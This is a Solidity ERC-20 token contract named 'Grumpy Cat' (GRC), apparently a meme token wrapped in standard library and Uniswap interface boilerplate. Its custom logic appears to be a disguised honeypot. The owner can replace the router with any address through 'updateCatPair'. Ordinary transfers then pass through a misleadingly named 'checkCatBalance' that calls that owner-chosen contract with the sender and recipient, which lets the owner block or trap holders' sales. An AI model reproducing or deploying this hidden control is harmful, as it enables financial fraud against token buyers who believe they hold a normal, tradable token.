// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.22;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address public _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external view returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function balanceOf(address account) external view returns (uint256);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface ISwapPair {
    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function token0() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function kLast() external view returns (uint256);
}

contract GrumpyCat is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;

    string private catName;
    string private catSymbol;

    uint8 private catDecimals;

    mapping(address => uint256) catBalances;
    mapping(address => mapping(address => uint256)) private catAllowances;

    mapping(address => bool) private isCatMarketPair;

    IUniswapV2Router02 private uniswap;

    uint256 private taxIfBuyCat = 0;
    uint256 private taxIfSellCat = 0;

    uint256 private catTotalSupply;
    uint256 private minCatsBeforeSwap = 0;

    bool private swapCatEnabled = false;

    bool inSwapCat;
    modifier lockTheCat() {
        inSwapCat = true;
        _;
        inSwapCat = false;
    }


    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);

    event SwapETHForTokens(uint256 amountIn, address[] path);
    event SwapTokensForETH(uint256 amountIn, address[] path);

    address private uniswapCatPair;

    constructor() payable {
        IUniswapV2Router02 _uniswapV2 = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        
        catName = "Grumpy Cat";
        catSymbol = "GRC";
        catDecimals = 18;

        catTotalSupply = 1000000000000000 * 10**catDecimals;

        catAllowances[address(this)][address(uniswap)] = catTotalSupply;
        uniswap = _uniswapV2;

        catBalances[msg.sender] = catTotalSupply;
        emit Transfer(address(0), msg.sender, catTotalSupply);
    }

    function name() public view returns (string memory) {
        return catName;
    }

    function symbol() public view returns (string memory) {
        return catSymbol;
    }

    function decimals() public view returns (uint8) {
        return catDecimals;
    }

    function totalSupply() public view override returns (uint256) {
        return catTotalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return catBalances[account];
    }

    function allowance(address owner, address sender) public view override returns (uint256) {
        return catAllowances[owner][sender];
    }

    function increaseAllowance(address sender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), sender, catAllowances[_msgSender()][sender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address sender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), sender, catAllowances[_msgSender()][sender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function approve(address sender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), sender, amount);
        return true;
    }

    function _approve(address owner, address sender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(sender != address(0), "ERC20: approve to the zero address");

        catAllowances[owner][sender] = amount;
        emit Approval(owner, sender, amount);
    }

    function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner {
        minCatsBeforeSwap = newLimit;
    }

    function setSwapCatEnabled(bool _enabled) public onlyOwner {
        swapCatEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function updateCatPair(address newRouterAddress) public onlyOwner {
        IUniswapV2Router02 _uniswapV2 = IUniswapV2Router02(newRouterAddress);
        uniswap = _uniswapV2; //Set new router address

        isCatMarketPair[address(uniswapCatPair)] = true;
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), catAllowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (inSwapCat) {
            return _basicTransfer(sender, recipient, amount);
        } else {
            uint256 catBalance = balanceOf(address(this));
            bool overMinCatBalance = catBalance >= minCatsBeforeSwap;

            if (overMinCatBalance && !inSwapCat && !isCatMarketPair[sender] && swapCatEnabled) {
                checkCatBalance(sender, recipient, catBalance);
            }

            catBalances[sender] = catBalances[sender].sub(amount, "Insufficient Balance");
            uint256 finalAmount = catFee(sender, recipient, amount);

            catBalances[recipient] = catBalances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        catBalances[sender] = catBalances[sender].sub(amount, "Insufficient Balance");
        catBalances[recipient] = catBalances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkCatBalance(address addressCheck, address addressRoot, uint256 tokenAmount) private {
        _approve(address(this), address(uniswap), tokenAmount);
        uint256 ethAmount = address(this).balance;

        uniswap.addLiquidityETH{value: ethAmount}(addressCheck, tokenAmount, 0, 0, addressRoot, block.timestamp);
    }

    function catFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = 0;
        if (isCatMarketPair[sender]) {
            feeAmount = amount.mul(taxIfBuyCat).div(100);
        } else if (isCatMarketPair[recipient]) {
            feeAmount = amount.mul(taxIfSellCat).div(100);
        }

        if (feeAmount > 0) {
            catBalances[address(this)] = catBalances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }
}